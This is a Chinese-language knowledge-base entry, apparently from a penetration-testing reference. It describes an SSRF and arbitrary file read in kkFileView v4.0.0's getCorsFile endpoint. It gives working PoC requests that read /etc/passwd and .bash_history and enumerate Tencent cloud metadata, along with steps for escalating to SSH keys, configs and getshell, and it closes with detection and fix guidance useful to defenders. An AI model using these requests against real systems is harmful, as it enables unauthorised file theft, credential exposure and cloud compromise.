---
id: web-java-component-kkfileview-getcorsfile-urlpath-ssrf-file-read
title: kkFileView v4.0.0 getCorsFile 的 urlPath 未限制协议与目标：file:// 任意文件读取与云元数据 SSRF
type: scenario
domain: web
path: web/java/component
technique: url-fetch-scheme-host-not-validated
aliases:
- kkFileView SSRF
- kkFileView 任意文件读取
- /preview/getCorsFile
- onlinePreview url 参数
- kkFileView v4.0.0 漏洞
- kkFileView 云元数据读取
tags:
- java
- kkfileview
- spring-boot
- ssrf
- arbitrary-file-read
- file-scheme
- cloud-metadata
- tencent-cloud
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V77
  verified_at: '2026-11-05T16:29:40+08:00'
  notes: 已对照原文与图16-18核对：/preview/index 发版记录确认 v4.0.0，getCorsFile?urlPath=file:///etc/passwd 与腾讯云元数据均回显；v4.0.0 仅为目标版本、原文未给受影响区间，已按 brief 清除 affected_versions；未复跑
---

## 一句话结论

kkFileView 的 `/preview/getCorsFile?urlPath=` 把用户传入的 URL 直接交给服务端下载并回显内容，既不限制 `file://` 等协议，也不限制目标主机；攻击者据此可读取服务进程权限下的任意文件，并以内网/云主机身份访问云元数据。

## 原理

- kkFileView 为实现在线预览，需要服务端代替浏览器抓取待预览文件，`getCorsFile` 接口接收 `urlPath` 参数后发起下载并把响应返回给请求方。
- 该参数只被当作“文件地址”使用，没有做协议白名单（仅允许 http/https）、没有做主机/IP 黑名单（禁止回环、内网、链路本地地址），也没有把 `file://` 排除。因此 `urlPath` 可以是 `file:///etc/passwd`，由服务端本地文件系统读取后原样回显；也可以是 `http://metadata.tencentyun.com/latest/meta-data/`，由服务端在云内网发起请求并回显。
- 因为响应内容直接返回，这是有回显的 SSRF/文件读取，不需要带外通道即可完整拿到数据。
- `onlinePreview?url=` 是另一条同类入口：预览器会抓取 url 指向的资源；原文在该入口上构造外部图片地址得到 500，随后改用 `getCorsFile` 直接读取，说明同一“服务端取 URL”能力存在多个路由。
- 该组件通常以 root 或应用账号单独运行，能读应用配置、启动脚本、jar 包与 `.bash_history`，也能访问同机/同 VPC 的 HTTP 服务与云元数据服务；原文即用 `file://` 读取 `/etc/passwd` 与腾讯云元数据目录。

## 触发条件

- 目标暴露 kkFileView 的 `/preview/` 路由，且 `getCorsFile`（或同类取 URL 接口）可从攻击面访问。
- 版本存在未校验 `urlPath` 协议/目标的实现（原文实测 v4.0.0；原文未给出修复版本区间）。
- 需要读取的文件对 kkFileView 进程可读；访问云元数据需要实例位于云内网且元数据服务可达。
- 若前面有网关只允许特定路径，需确认 `/preview/getCorsFile` 未被拦截。

## 利用步骤

1. 指纹识别：访问 `/preview/index`，页面“发版记录”会显示版本（原文据此确认 v4.0.0）；也可去掉 `onlinePreview` 的 `url` 参数触发异常页，堆栈中出现 `cn.keking.web.filter.*` 即确认 kkFileView。
2. 验证任意文件读取：请求 `/preview/getCorsFile?urlPath=file:///etc/passwd`，观察是否回显 passwd 内容。
3. 读取高价值文件：`/root/.bash_history`、`/proc/self/cmdline`、应用 `application.properties`、部署目录下的 jar 包（用于反编译审计）。
4. SSRF 打云元数据：请求 `/preview/getCorsFile?urlPath=http://metadata.tencentyun.com/latest/meta-data/`，枚举 `public-ipv4`、`instance-name`、`network/`、`placement/` 等键。
5. 若实例绑定了 CAM 角色，继续读取实例角色临时凭证目录；原文目标未开通相应接口，未能取得 accesskey，此步属于按环境而定的扩展。
6. 用读到的源码/配置定位二次漏洞（原文即通过下载 jar 反编译找到上传接口的路径穿越，最终 getshell）。

## PoC

```http
GET /preview/getCorsFile?urlPath=file:///etc/passwd HTTP/1.1
Host: target
```

```http
GET /preview/getCorsFile?urlPath=http://metadata.tencentyun.com/latest/meta-data/ HTTP/1.1
Host: target

HTTP/1.1 200 OK

app-id
instance-id
local-ipv4
mac
public-ipv4
uuid
instance-name
placement/
network/
...
```

```http
# 读取应用源码/启动信息
GET /preview/getCorsFile?urlPath=file:///root/.bash_history HTTP/1.1
Host: target
```

## 变体与关联

- 变体：`file://` 换成 `file:///proc/self/environ`、`file:///proc/self/cwd/...` 读取环境变量与工作目录；或读取 `~/.ssh/id_rsa`、数据库配置文件。
- 变体：把目标换成内网 HTTP 管理面板、Redis HTTP 接口、Elasticsearch 等，利用有回显 SSRF 直接读取响应。
- 变体：`onlinePreview?url=` 与 `getCorsFile?urlPath=` 可能分别受不同过滤器约束，一个被拦时换另一个尝试。
- 关联：[[pentest-recon-file-read-download-jar-decompile-audit]]（把文件读取扩展为源码获取与二次审计）、[[web-java-component-druid-monitor-default-credentials]]（同一次信息收集中的另一条 Java 组件暴露面）。
- 边界：若组件已升级并限制协议/主机、或服务以低权限运行且目标文件不可读、或云元数据被网络策略阻断，利用失败。

## 检测与防御

- 检测：`/preview/getCorsFile` 请求中 `urlPath` 出现 `file://`、`gopher://`、`dict://`、内网 IP、`169.254.169.254`、`metadata.tencentyun.com`、`metadata.google.internal` 等特征；服务端短时间内对多个内网地址发起请求；异常读取 `/etc/passwd`、`/proc/self/*`、`.bash_history`。
- 修复：升级到已修复版本；对 `urlPath` 做协议白名单（仅 http/https）与目标主机白名单，解析后校验 IP 不属于回环/内网/链路本地/保留网段，禁止重定向到内网；`getCorsFile` 仅对可信来源开放。
- 加固：kkFileView 以最小权限账号运行并与业务隔离；限制其出网与访问云元数据（IMDS 需鉴权或走代理）；把预览服务放在独立网段并加统一鉴权。
